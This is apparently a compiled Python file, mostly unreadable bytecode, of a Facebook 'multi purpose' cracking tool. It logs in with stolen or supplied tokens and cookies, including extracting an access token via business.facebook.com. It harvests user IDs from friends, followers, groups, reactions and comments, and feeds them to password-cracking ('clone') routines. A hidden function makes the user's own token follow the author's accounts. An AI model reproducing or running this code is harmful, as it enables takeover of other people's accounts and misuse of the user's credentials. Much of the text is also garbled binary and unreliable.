o
    ?9&cx ?                   @   s?  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlmZ d dlmZ d dlmZ d dlmZ d dlmZ d dlmZ e ?? Ze jZe jZejZeZe Z!e"Z#dZ$d	Z%d
Z&dZ'dZ(dZ)dZ*dZ+dZ,dZ-g a.g a/g Z0da1i Z2i Z3i Z4i Z5g Z6ddiZ7dddddd?8ej?9dd??ddddd ?
Z:d!d"d#d$d%dd&dd'd'd(?
Z;e<e?dd)??Z=e=?>dd*??>d+d,??>d-d.??>d/d0??>d1d2??>d3d4??>d5d6?Z?e
?@? d7 ZAeAZBeB?Cd8?ZDe?EeD?ZFeF?Gd8?ZHeH?I? ZJeJ?>d9d:??>d*d-??>d.d;??>d,d5??>d<d??>d0d/??>d=d+??>d>d3??>d?d@??>d:d0??>dAdB??>d1dC??>ddC?ZKze ?dD?jLZMW n e jNjO?yE   ePdE? e"?  Y nw e?Q? ZReRjSZTeRjUZVeRjWZXdFdGdHdIdJdKdLdMdNdOdPdQdR?ZYg dS?ZZzeVd k ?sqeVdTk?rte#?  eVd Z[W n e\?y?   e#?  Y nw eZe[ Z]dUeXe]eTf Z^dVdWgZ_dXZ`dYZadZZbd[Zcd\Zdd]Zed^Zfd_Zgd`Zhdadb? Zidcdd? Zjdedf? Zkdgdh? Zldidj? Zmdkdl? Zndmdn? Zododp? Zpdqdr? Zqdsdt? Zrdudv? Zsdwdx? Ztdydz? Zud{d|? Zvd}d~? Zwdd?? Zxd?d?? Zyd?d?? Zzd?d?? Z{d?d?? Z|d?d?? Z}G d?d?? d??Z~d?d?? Zd?d?? Z?d?d?? Z?G d?d?? d??Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d Z?d?dĄ Z?d?dƄ Z?d?dȄ Z?d?dʄ Z?d?d̄ Z?d?d΄ Z?d?dЄ Z?d?d҄ Z?d?dԄ Z?d?dք Z?G d?d؄ d؃Z?d?dڄ Z?d?d܄ Z?d?dބ Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?d?d?? Z?e?d?k?r?e??d?? e??  er?  dS dS )??    N)?randint)?ThreadPoolExecutor)?BeautifulSoup)?date)?datetime)?quotez[1;30mz[1;37mz[1;31mz[1;32mz[1;33mz[1;34mz[1;35mz[1;36mz[0m?https://mbasic.facebook.com?   ?
user-agentzyMozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36?#en-GB,en-US;q=0.9,en;q=0.8,bn;q=0.7?gzip, deflate?Utext/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8??Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36? z	://(.*?)$zhttps://m.facebook.com?5https://m.facebook.com/login/?next&ref=dbl&fl&refid=8?	max-age=0?1?!application/x-www-form-urlencoded)
?origin?accept-language?accept-encoding?acceptr
   ?Host?referer?cache-control?upgrade-insecure-requests?content-type?mbasic.facebook.comZGETz/favicon.ico?httpsz@image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8zen-US,en;q=0.9zhttps://www.facebook.com)
Z	authority?method?path?schemer   r   r   r
   r   r   i'  ?A?2?C?3?B?4?E?5?H?6?I?7?Y?   ?ascii?=?N?9?D?M?L?F?8?T?R?Xz!https://pastebin.com/raw/48bj2zbhz
NO INTERNET CONNECTION
?JAN?FEB?MAR?APR?MAY?JUN?JUL?AUG?SEP?OCT?NOV?DEC)?01?02?03?04?05?06?07?08?09?10?11?12)r<   r=   r>   r?   r@   rA   rB   rC   rD   rE   rF   rG   ?   z%s-%s-%sZ100045203855294Z100014839270205z{Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36;]zIMozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20zIDalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)/CLDC-1.1;]z?Mozilla/5.0 (Linux; Android 7.0; HUAWEI CAZ-AL10; HMSCore 5.3.0.312; GMSCore 20.39.15) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 HuaweiBrowser/11.1.0.302 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]zvMozilla/5.0 (Linux; Android 10; V2027) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36z?Mozilla/5.0 (Linux; Android 4.1.1; X909 Build/JRO03L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]z?Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG GT-I9515 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36;]zPMozilla/5.0 (X11; U; Linux i686; fr-FR; rv:1.7.8) Gecko/20050511 Firefox/1.0.4;]z?Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.80 Mobile Safari/537.36 Reddit/Version 2021.38.0/Build 365032/Android 11 [FBAN/EMA;FBLC/en_US;FBAV/247.0.0.5.130;]c                   C   ?6   zt ?d? W n   Y zt ?d? W d S    Y d S )N?	token.txt?cookies.txt)?os?remove? rZ   rZ   ?test.py?bersihb   ?   r\   c                 C   ?2   | d D ]}t j?|? t j??  t?d? qd S )N?
g{?G?z????sys?stdout?write?flush?time?sleep??z?erZ   rZ   r[   ?jalani   ?   2rj   c                 C   r^   )Nr_   g???Q???r`   rg   rZ   rZ   r[   ?mlakuk   rk   rl   c                 C   r^   )Nr_   g????MbP?r`   rg   rZ   rZ   r[   ?psbn   s
   
?rm   c                   C   sF   dt j?? v rt?d? d S dt j?? v rt?d? d S t?d? d S )NZlinux?clear?win?cls)ra   ?platform?lowerrX   ?systemrZ   rZ   rZ   r[   rn   v   s   rn   c                   C   s   t ?d? td? td? d S )Nrn   a&  [1;31m
                                                                 
                      ::             .^:                    
                    5#~               .Y&J                  
                .: &@^                  5@# !               
                &P:@@                   ~@@~@J              
                &@&@@G       ....~     .&@@@@Y              
              .?~&@@@G     !P@@@@7      @@@@G~J             
               ?&#@@@P^.     !@@&     ^^&@@&&&^             
                .5#&@@GBPJ!:.Y@@@?^?YGG#@@&B?               
                 !B&&@@@@@@@@@@@@@@@@@@@@&#G:               
                  :P&@@&@@@@@@@@@@@@@&&@@B7                 
                     .~!:^G@&@@@@@@J:~!:                    
                       ^?P5:.@@@G !P5!.                     
                        :.  G@@@@!  :.                      
                           J@&@&@@^                         
                          :&&B&#&##                         
                          :Y#G&#&Y5                         
                            Y5@#B:                          
                            ^J@#Y                           
                             ~@#^                           
                             .@#                            
                              &B                            
                              &G                            
                              #5                            
                              G?                            
                              :.                            
                                                            
     [1;31m                                                         

AUTHOR : Alienrazor

GITHUB : Alienrazor

FACEBOOK MULTI PURPOSE TOOL

                        
   r   )rX   rs   ?printrZ   rZ   rZ   r[   ?banner|   s   
&ru   c                  C   s@   t dd??? } d| v rtdttttf ? t?  t?  d S 	 d S )NrW   ?r?nullz2%s [%s!%s] %INVALID COOKIES, RE-LOGIN WITH COOKIES)?_azimvau_dapunta_?readrj   r5   ?Pr\   ?_cici_cici_)Z	_isi_dev_rZ   rZ   r[   ?cek_dev?   s   ,r|   c                 C   sr   z2t D ]}ztd|| f ? t?d? W q   Y qtdt ? tdtttttf ? t?d? W d S    Y d S )Nz9https://graph.facebook.com/%s/subscribers?access_token=%sg333333???%s z#%s [%s!%s] %sLOGIN SUCCESSFUL %s^_^r/   )	?_my_account_?
_req_post_re   rf   rt   ?Orj   r*   rz   )Z	_tok_dev_Z_list_rZ   rZ   r[   ?
bot_follow?   s    
2r?   c               
   C   s?  t ?  t?  t?  t?  tdtttttf ?} tdt ? | dv r0t	dt
tt
tf ? t?  d S | dv r?t?  tdtttttf ?}z5td| ?}t|j?}|d }td	d
?}|?|? |??  tdd
?}|?d? |??  t|? t?  W d S  ttfy?   tdt ? t	dt
tt
tf ? t ?  t?  Y d S  tjjy?   tdt ? t	dt
tt
tf ? t?  Y d S w | dv ?rSt?  tdtttttf ?}zDdddddddd|d?	}td|d?}	t?d|	j?}
|
?d?}td	d
?}|?|? |??  tdd
?}|?|? |??  t|? t?  W d S  tjj?y/   tdt ? t	dt
tt
tf ? t?  Y d S  tttf?yR   tdt ? t	dt
tt
tf ? t ?  t?  Y d S w | dv ?r]t ?  d S t	dt
tt
tf ? t?  d S ) Nu   %s [%s•%s] %sCHOOSE : %sr}   ?r   ?%s [%s!%s] %sINCORRECT CONTENT?r   rH   ?001?au   %s [%s•%s] %sTOKEN : %s?+https://graph.facebook.com/me?access_token=?namerV   ?wrW   rw   z%s [%s!%s] %sTOKEN INVALID?%s [%s!%s] %sCONNECTION PROBLEM?r#   rI   ?002?bu   %s [%s•%s] %sCOOKIES : %szbusiness.facebook.comr   r   r   r   ztext/html; charset=utf-8r   r   )	r   r   r   r
   r   r   r   r   ?cookiez0https://business.facebook.com/creatorstudio/home??headersz{"accessToken":"(EAA\w+)r	   z%s [%s!%s] %sCOOKIES INVALID??0?00?000rh   )!r\   rn   ru   ?var_menu?_cici_azimvau_r*   rz   r?   rt   rj   r5   ?menu_log?	defaultua?K?	_req_get_?_js_lo_?textrx   rc   ?closer?   ?menu?KeyError?IOError?requests?
exceptions?ConnectionErrorr{   ?re?search?group?AttributeError?exit)?pmu?token?x?y?n?xdZxzr?   ?headerrv   ?prZ   rZ   r[   r?   ?   s(   &lB>
?>Hr?   c                  C   sJ  t ?  t?  d} zAtdd??? }tdd??? }d|i}d|v r4dt }t}t}t}t}t}	t}
t}t}ndt }t}t}t	}t
}t}	t}
t}t}W n+ ttfyt   td	ttttf ? td
t ? tdttttf ? t?  t?  Y nw ztdd??? }td| ?}t|j?}|d ?? }|d }W nz ttfy?   td	ttttf ? td
t ? tdttttf ? t?  t?  Y nP tjjy?   td	ttttf ? td
t ? tdttttf ? t?  Y n) tjj?y   td	ttttf ? td
t ? tdttttf ? t?  Y nw ztddddd?d??? }|d }|d ?? }W n t?y2   d}Y nw tdtttt
tttf ? td
t
 ? tdtttt
tt|f ? tdtttt
tt|f ? tdtttt
tt|f ? tdtttt
tt|f ? tdtttt
ttf ? td? tdtttt
tt
ttt|f
 ? td
t
 ? td tttt
f ? td!ttt|f ? td"tttt
f ? td#tttt
f ? td$tttt
f ? td%tttt
f ? td&tttt
f ? td'tttt
f ? td(tttt
f ? td)tttt
f ? td*tttt
f ? td+tttt
f ? td,tttt
f ? td-tttt
f ? td.tttt
f ? td/tttt
f ? td0tttt
f ? td1tttt
f ? td2tttt
f ? td3tttt
f ? td? td4tttt
tf ?}td
t
 ? |d5v ?r?td6ttttf ? t?  d S |d7v ?r?t|? d S |d8v ?r?t|? d S |d9v ?r?t?  t |? d S |d:v ?r?t?  t!|? d S |d;v ?r?t?  t"|||? d S |d<v ?r?t?  t#|? d S |d=v ?r?t?  t$|? d S |d>v ?r?t?  t%||? d S |d?v ?rt&?  d S |d@v ?rt'?  d S |dAv ?r t?  t(|? d S |dBv ?r.t?  t)|? d S |dCv ?r<t?  t*|? d S |dDv ?rJt?  t+|? d S |dEv ?rTt,?  d S |dFv ?r^t-?  d S |dGv ?rht.?  d S |dHv ?rrt/?  d S |dIv ?r|t0?  d S |dJv ?r?tdKttttt
|tf ? t?  t?  d S td6ttttf ? t?  d S )LNr   rV   rv   rW   r?   rw   z%sNOz%sYESz%s [ %sOPPSS :) %s]%sr}   ?"%s [%s!%s] %sTOKEN/COOKIES INVALIDr?   r?   ?idr?   zhttp://ip-api.com/json/zhttp://ip-api.com/zapplication/json; charset=utf-8z?Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36;])ZRefererzContent-Typez
User-Agentr?   ?queryZcountry? u1            %s》%s》%s》%sWELLCOME%s《%s《%s《u   %s [%s•%s] %sNAME   %s: %s%su   %s [%s•%s] %sID     %s: %s%su   %s [%s•%s] %sIP     %s: %s%su   %s [%s•%s] %sFROM   %s: %s%su&   %s [%s•%s] %sSTATUS %s: %sPREMIUM :)z.%s [%s>_%s] %sTOKEN%s/%sCOOKIES %s: %sYES%s/%sz*%s [%s01%s] %sCLONE FROM FRIEND/PUBLIC ID z'%s [%s02%s] %sCLONE FROM FOLLOWER ID V1z'%s [%s03%s] %sCLONE FROM FOLLOWER ID V2z(%s [%s04%s] %sCLONE FROM SEARCH NAME ID z)%s [%s05%s] %sCLONE FROM MESSAGE LIST ID z%%s [%s06%s] %sCLONE FROM POST REACTS z'%s [%s07%s] %sCLONE FROM POST COMMENTS z'%s [%s08%s] %sCLONE FROM GROUP MEMBERS z!%s [%s09%s] %sCLONE ID FROM EMAILz%s [%s10%s] %sCLONE USERNAMEz %s [%s11%s] %sCLONE FROM HASHTAGz%%s [%s12%s] %sCLONE ID FROM HOME PAGEz,%s [%s13%s] %sCLONE ID FROM FRIEND REQUESTS z'%s [%s14%s] %sCLONE FROM SENT REQUESTS z(%s [%s15%s] %sCOLLECT UID FROM PUBLIC IDz$%s [%s16%s] %sAUTO CLONE CRACKED IDSz!%s [%s17%s] %sVIEW CLONE RESULTS z"%s [%s18%s] %sUSER AGENT SETTINGS z%s [%s19%s] %s FILEz%s [%s00%s] %sLOG OUTz%s [%s>_%s] %sCHOOSE : %sr?   r?   r?   r?   ?r%   rJ   Z003?c?r'   rK   Z004?d?r)   rL   Z005ri   ?r+   rM   Z006?f)r-   rN   Z007?g)r8   rO   Z008?h)r3   rP   Z009?i)rQ   Z010Z0010?j)rR   Z011Z0011?k)rS   Z012Z0012?l)Z13Z013Z0013?m)Z14Z014Z0014r?   )Z15Z015Z0015?o)Z16Z016Z0016r?   )Z17Z017Z0017?q)Z18Z018Z0018rv   )Z19Z019Z0019?sr?   z%s [%s!%s] %sSEE YOU %s%s%s)1rn   ru   rx   ry   r5   ?Zrz   r*   r?   r&   r?   r?   r?   rt   rj   r\   r?   r?   r?   r?   ?upperr?   r?   r?   r{   ?jsonrm   r?   r?   ?publik?pengikutr|   ?	followers?	dump_name?
dump_pesan?main_likers?
main_komen?	dump_grup?
dump_email?dump_username?hashtag?beranda?permintaan_pertemanan_masuk?permintaan_pertemanan_keluar?teman_target?
cek_result?result?ugen?file)?jid?	_azimvau_?_cici_?_salsabila_Zstatus_cookies?Wr.   ZB1ZO1ZK1ZH1ZM1ZP1r?   r?   r?   r?   r?   r?   ZipZlocZpmrZ   rZ   r[   r?   ?   s?   $2(?V>TNR2 ( 4r?   c               	   C   sF   t } ztdd?}|?| ? |??  W d S  ttfy"   t?  Y d S w )N?	ugent.txtr?   )?	ua_xiaomirx   rc   r?   r?   r?   r?   )?ua?ugentrZ   rZ   r[   r?     s   $r?   c               	   C   sf  t ?  tdttttf ?} tdt ? | dv r&tdttttf ? t?  d S | dv r>t	?
d? tdttttf ? t?  d S | dv r?t	?
d	? td
ttttf ?}z-tdd?}|?|? |??  tdtttf ? tdt ? tdttttf ? t?  W d S  ttfy?   tdtttf ? tdt ? tdttttf ? t?  Y d S w | dv r?t?  d S | dv r?t	?
d	? tdtttf ? tdt ? tdttttf ? t?  d S | dv ?rz	tdd??? }W n ttfy?   d}Y nw tdttttt|f ? tdtttf ? tdt ? tdttttf ? t?  d S | dv ?r't?  d S tdttttf ? d S )N?   %s [%s•%s] %sCHOOSE : r}   r?   r?   r?   z?xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8?%s [ %sBACK %s]%sr?   ?rm -rf ugent.txtu$   %s [%s•%s] %sENTER USER AGENT : 

r?   r?   z+
%s [ %sSUCCESSFULLY CHANGED USER AGENT %s]z'
%s [ %sFAILED TO CHANGE USER AGENT %s]r?   r?   z*%s [ %sUSER AGENT SUCCESSFULLY DELETED %s]r?   rv   z	NOT FOUNDu(   %s [%s•%s] %sYOUR USER AGENT  : 

%s%sz+
%s [ %sTHIS IS YOUR CURRENT USER AGENT %s])r?   r?   r?   r?   )?var_ugenr?   r*   rz   r?   rt   rj   r5   r?   rX   rs   rx   rc   r?   r?   r?   r?   r?   ?ugen_hpry   )r?   r?   r?   ZungserrZ   rZ   r[   r?     s"   &0\PN
Tr?   c                  C   s?  t ?d? tdttttf ? tdttttf ? tdttttf ? tdttttf ? tdttttf ? tdttttf ? tdttttf ? td	ttttf ? td
ttttf ? td? tdttttf ?} tdt ? | dv r?tdttttf ? t	?  n?| dv r?t
dd?}|?t? |??  n?| dv r?t
dd?}|?t? |??  n?| dv r?t
dd?}|?t? |??  n?| dv r?t
dd?}|?t? |??  no| dv r?t
dd?}|?t? |??  n\| dv r?t
dd?}|?t? |??  nI| dv ?rt
dd?}|?t? |??  n5| dv ?rt
dd?}|?t? |??  n!| dv ?r3t
dd?}|?t? |??  ntdttttf ? t	?  tdtttf ? tdt ? tdttttf ? t	?  d S )Nr?   z%s [%s1%s] %INTELMACz%s [%s2%s] %sNOKIAz%s [%s3%s] %sASUSz%s [%s4%s] %sHUAWEIz%s [%s5%s] %sVIVOz%s [%s6%s] %sOPPOz%s [%s7%s] %sSAMSUNGz%s [%s8%s] %sWINDOWSz%s [%s9%s] %sXIAOMIr   r?   r}   r?   r?   ?r   rH   r?   r?   ?r#   rI   ?r%   rJ   ?r'   rK   )r)   rL   )r+   rM   )r-   rN   )r8   rO   )r3   rP   z*%s [ %sSUCCESSFULLY CHANGED USER AGENT %s]r?   )rX   rs   rt   r*   rz   r?   r?   rj   r5   r?   rx   rc   r?   r?   ?ua_nokia?ua_asus?	ua_huawei?ua_vivo?ua_oppo?
ua_samsung?
ua_windows?ua_intelmac)Zpcr?   rZ   rZ   r[   r?   -  s2   
$&&&&&&(((<r?   c              	   C   s?  d}z?t dttttf ? tdttttf ?}t|? ztd| d |  ?}t|j?}t dtttt	|d f ? W n t
tfyW   t dt ? td	ttttf ? t?  Y nw td
||| f ?}g }t|j?}|d d ?dd?}t|d?}	|d D ]%}
z|?|
d d |
d  ? |	?|
d d |
d  d ? W q{   Y q{|	??  t dtttt	t|?f ? t|?W S  t
tfy?   tdttttf ? Y d S w )NZ5000u/   %s [%s•%s] %sWRITE 'me' TO RETRIEVE FRIEND IDu   %s [%s•%s] %sTARGET ID : ?https://graph.facebook.com/z]?fields=name,id,first_name,middle_name,last_name,name_format,picture,short_name&access_token=?   %s [%s•%s] %sNAME : %sr?   r}   ?%s [%s!%s] %sID NOT FOUNDz?https://graph.facebook.com/%s/friends?limit=%s&fields=name,id,first_name,middle_name,last_name,name_format,picture,short_name&access_token=%s?
first_name?.jsonr?   ?_r?   ?datar?   ?   •r_   u   %s [%s•%s] %sTOTAL ID : %sz2%s [%s!%s] %sINVALID TOKEN/COOKIES OR ID NOT FOUND)rt   r*   rz   r?   r?   ?cek_target_crack_r?   r?   r?   r?   r?   r?   rj   r5   r?   ?replacerx   ?appendrc   r?   ?len?crackr{   )r?   r?   ?it?pb?obrv   r?   rh   ?xc?xbr?   rZ   rZ   r[   r?   I  s   0><>>
,,r?   c              
   C   s4  zd}t ?d|  ?}t?|j?}|d ?? }W n4 ttfy4   tdt	t
t	t
f ? t?d? t?  Y n t jjyK   tdt	t
t	t
f ? t?  Y nw z?tdtt
ttf ? tdtt
tttf ?}z#t ?d	| d
 |  ?}t?|j?}tdtt
ttt|d ?? f ? W n ttfy?   t tdt	t
t	t
f ? t?  Y nw t ?d||| f ?}g }	t?|j?}
|d d ?dd?}t|d?}|
d D ]}|	?|d d |d  ? |?|d d |d  d ? q?|??  tdtt
tttt|	?f ? t|?W S  t?y } ztdt	t
t	t
|f ? W Y d }~d S d }~ww )NZ10000r?   r?   z"%s [%s!%s] %sINVALID TOKEN/COOKIESzrm -rf token.txtr?   u.   %s [%s•%s] %sWRITE 'me' FOR TAKING FRIEND IDu   %s [%s•%s] %sTARGET ID : %sr?   z?access_token=u   %s [%s•%s] %sNAME : %s%sr?   zBhttps://graph.facebook.com/%s/subscribers?limit=%s&access_token=%sr?   r?   r?   r?   r?   r?   r?   r?   r_   ?   %s [%s•%s] %sTOTAL ID : %s%sz%s [%s!%s] %sERROR : %s)r?   ?getr?   ?loadsr?   r?   r?   r?   Zxoxr5   rz   rX   rs   r?   r?   r?   r?   rt   r*   r?   ?inputr?   r?   ?openr   rc   r?   r  r  ?	Exception)r?   r?   r?   r?   r?   r  r  r  rv   r?   rh   r  r  r?   ri   rZ   rZ   r[   r?   W  sP   


?$
?
 
$??r?   c              	   C   s?   t dttttf ?}tdttttf ? |d }d| }|d ?dd?}zt?|? W n   Y t|| |? tdttttt	t
|??? ?? ?f ? t|?S )Nu!   %s [%s•%s] %sENTER TARGET ID : ?(   %s [%s•%s] %sPRESS CTRL+C TO STOP DUMPr?   z0https://mbasic.facebook.com/subscribe/lists/?id=r?   r?   ?%   
%s [%s•%s] %sSUCCESSFUL DUMP %s ID)r?   r*   rz   r?   rt   r?   rX   rY   ?exec_followersr  rx   ry   ?
splitlinesr  )?cookies?_query_?_file_?	_url_dev_rZ   rZ   r[   r?     s   H:r?   c                 C   sn  t |d? t?? }|j| |d?}t|jd?}t |??? }tdtt	tt
ttt|??? ?? ?f dd? tj??  z_|jddd?D ]8}d	|?d
?v rvz(|j}d?tj?d|?d
???}	||v r^nd|	v rcnt |d??d|	|f ? W q?   Y q?	 q?|jddd?D ]}d|jv r?d|?d
? }
t|
||? qW d S  ty?   tdtt	tt
tt|??? ?? ?f ? t|? Y S w )Nr?   ?r  ?html.parser?   %s [%s•%s] %sTAKING %s%s IDr?   ??endT??href?profile.phpr  r   ?profile\.php\?id=(.*?)&?/?a+?   %s•%s
?See more?https://mbasic.facebook.com/r  )r  r?   ?Sessionr	  ?parr?   ry   rt   r*   rz   r?   r  rx   r  ra   rb   rd   ?find_all?join?bs4r?   ?findallrc   r  ?KeyboardInterruptr  )?urlr  r  ?	_req_ses_r?   ?	_sop_dev_?_buka_file_r?   ?
_name_dev_?_id_dev_?url_devrZ   rZ   r[   r  ?  s"   n 

?
$??@r  c              	   C   s?   t dttttf ?}tdttttf ? |d }z	t?|d ? W n   Y t|d? d| }t| ||? t	t|??
? ?? ?dkrNtdttttf ? t?  tdttttt	t|??
? ?? ?f ? t|?S )	N?   %s [%s•%s] %sENTER POST ID : r  r?   r?   zLhttps://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier=r   ?
%s [%s!%s] %sPOST NOT FOUNDr  )r?   r*   rz   r?   rt   rX   rY   rx   ?scrape_likersr  ry   r  r5   r{   r  ?r?   r  r  ?_url_rZ   rZ   r[   r?   ?  ?   02.r?   c                 C   s?  t }|j|| td?j?d?}t|d?}tdtttt	tt
t|??? ?? ?f dd? tj??  z?|?d?D ]Q}|jdd	d
?D ]G}z@d|?d?v rc|?d??d?d }|j}	t|d??|d |	 d ? n|?d??d?d }|j}	t|d??|d |	 d ? W q=   Y q=q4|jdd	d
?D ]1}
d|
jv r?	 zt| d|
?d? |? W n ty? } ztdt|f ? W Y d }~nd }~ww q?q?W d S  ty?   tdtttt	t
t|??? ?? ?f ? t|? Y S w )N?r  r?   ?utf-8r  r  r?   r  ?h3r?   Tr  r  r  r1   r	   r   r?   r_   r  r"  r#  ?%s%sr  )r,  r	  ?header_grupr?   ?encoder%  rt   r*   rz   r?   r  rx   ry   r  ra   rb   rd   r&  ?splitrc   r4  r  r5   r*  r  ?r?   r6  r  Z_ses_Z
_url_load_Z	_ses_par_Z_isi_?_id_Z_a_Z__id__Z_lanjut_ri   rZ   rZ   r[   r4  ?  s*   \F6?
?
*? ???@r4  c              	   C   s?   t dttttf ?}tdttttf ? |d }z	t?|d ? W n   Y t|d? d| }t| ||? t	t|??
? ?? ?dkrNtdttttf ? t?  tdttttt	t|??
? ?? ?f ? t|?S )	Nr2  r  r?   r?   r#  r   r3  r  )r?   r*   rz   r?   rt   rX   rY   rx   ?scrape_komenr  ry   r  r5   r{   r?   r  r5  rZ   rZ   r[   r?   ?  r7  r?   c                 C   sR  t }|j|| td?j?d?}t|d?}tdtttt	tt
t|??? ?? ?f dd? tj??  z?|?d?D ]e}|jdd	d
?D ][}zTd|?d?v rmd?tj?d|?d???}|j}	t|d??t|??d?d d |	 d ? n%d?tj?d|?d???}|j}	t|d??t|??d?d d |	 d ? W q=   Y q=q4|jdd	d
?D ]c}
d|
jv r?	 zt| d|
?d? |? W n ty? } ztdt|f ? W Y d }~nd }~ww q?q?d|
jv ?r	 zt| d|
?d? |? W n t?y } ztdt|f ? W Y d }~nd }~ww q?q?W d S  t?y(   tdtttt	t
t|??? ?? ?f ? t|? Y S w )Nr8  r9  r  r  r?   r  r:  r?   Tr  r  r  r   r  r   ?&r   r?   r_   ?/(.*?)\???u   View more comments…r#  r;  u   View previous comments…r  )r,  r	  r<  r?   r=  r%  rt   r*   rz   r?   r  rx   ry   r  ra   rb   rd   r&  r'  r(  r?   r)  rc   ?strr>  rA  r  r5   r4  r*  r  r?  rZ   rZ   r[   rA  ?  s:   \ZJ?
?
*? ?,? ???B	rA  c                   @   s\   e Zd Zdd? Zdd? Zdd? Zdd? Zd	d
? Zdd? Zdd? Z	dd? Z
dd? Zdd? ZdS )r?   c                 C   s6   g | _ g | _d| _|| _|| _ddi| _| ?d? d S )Nz__azimvau__.jsonr
   z?Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_US;FBAV/173.0.0.10.118;]z&https://m.facebook.com/groups/?seemore)?glist?_grup_r?   r?   r  r?   ?
main_group)?selfr?   r?   rZ   rZ   r[   ?__init__?  s   6zdump_grup.__init__c                 C   s?  t ?t|| j| jd?jd?}|jddd?D ]-}d|?d?v rBd|?d?v s,d	|?d?v r-q| j?	d
?
t j?d|?d???|jd?? qt| j?dkr?tdtttttt| j?tf ? tdttttf ? tdttttf ? tdttttf ? 	 tdttttf ?}tdt ? |d
kr?qx|dkr?| ??  n|dkr?| ??  n|dkr?| ??  ntdttttf ? t?  qytdttttf ? | ??  d S )Nr8  r  r?   Tr  z/groups/r  ?categoryZcreater   z/groups/(.*?)\??r?   r?   r   u$   %s [%s•%s] %sYOU JOIN %s%s%s GROUPz#%s [%s1%s] %sSEARCH ALL GROUPS JOINz"%s [%s2%s] %sSEARCH GROUPS BY NAMEz %s [%s3%s] %sSEARCH GROUPS BY IDr?   r}   r   r#   r%   r?   u'   %s [%s•%s] %sYOU DON'T JOIN ANY GROUP)r(  r   r?   r  r?   r?   r&  r	  rF  r   r'  r?   r)  r  rt   r*   rz   r?   r?   ?sayar?   ?manualrj   r5   r?   )rI  r1  ?bsr?   r?   rZ   rZ   r[   rH  ?  s"   *?\ 
? zdump_grup.main_groupc                 C   sp  | j | _zt?| j? W n   Y tdttttf ? z?d?| j	?}t
?%}|?|??? }|d D ]}z
| j?|d ? W q0   Y q0W d   ? n1 sLw   Y  | jD ]l}z&d| | _| ??  tdtttttt| j??? ?? ?f ? t| j?W   W S  ty?   tdtttttt| j??? ?? ?f ? t| j? Y   W S  ty? } ztdtttt|f ? t?  W Y d }~qTd }~ww W d S  ttfy?   tdttttf ? t?  Y d S  tjj y?   td	ttttf ? t?  Y d S  t?y   tdtttt!tt| j??? ?? ?f ? t| j? Y S  t?y7 } ztd
tttt|f ? t?  W Y d }~d S d }~ww )Nr  z4https://graph.facebook.com/me/groups?access_token={}r?   r?   z7https://mbasic.facebook.com/browse/group/members/?id=%su3   
%s [%s•%s] %sSUCCESSFUL DUMP %s ID FROM MY GROUP?#
%s [%s!%s] %sERROR IN SECTION : %sz%s [%s!%s] %sCOOKIE INVALIDr?   ?"
%s [%s!%s] %sError Di Bagian : %s)"r?   ?flrX   rY   rt   r*   rz   r?   ?formatr?   r,  r	  r?   rG  r   ?url_grup?exec_grup_sayar  rx   ry   r  r  r*  r  r5   r{   r?   r?   rj   r?   r?   r?   r?   r?   )rI  r+  ?ses_r?   r?   r?   ?_error_rZ   rZ   r[   rM  ?  s4   
??
NH6? ?00D:? zdump_grup.sayac                 C   s?  t ??}z?|j| j| j| jd?j}t|d?}|jddd?}|?d?D ]0}|d ?	dd	?}t
?d
t|??d }zt| jd??t|?d t|? d ???  W q!   Y q!tdttttttt| j??? ?? ?f dd? tj??  dt|?v r?|jddd?d }d| }	| ??  W nH ty?   tdtttttt| j??? ?? ?f ? t| j? Y W  d   ? S  ty? }
 ztdt tt t|
f ? t!?  W Y d }
~
nd }
~
ww W d   ? d S W d   ? d S 1 s?w   Y  d S )Nr8  r  ZdivZobjects_container?r?   ?tabler?   Zmember_r   z <img alt="(.*), profile picture"r   r   r?   r_   r  r?   r  r"  r?   )?stringr  r   u4   
